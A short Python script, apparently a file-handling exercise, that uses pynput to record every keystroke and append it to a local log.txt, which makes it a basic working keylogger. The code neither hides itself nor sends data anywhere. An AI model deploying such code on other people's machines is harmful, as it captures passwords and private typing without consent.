# Storing  the keystokes in a text file̥
# file Handling
from pynput.keyboard import Listener

def writetofile(key):
    letter = str(key)
    letter = letter.replace("'","")

    if letter == 'Key.space':
        letter = ' '

    with open("log.txt", 'a') as f:
        f.write(letter)

with Listener(on_press=writetofile) as l:
    l.join()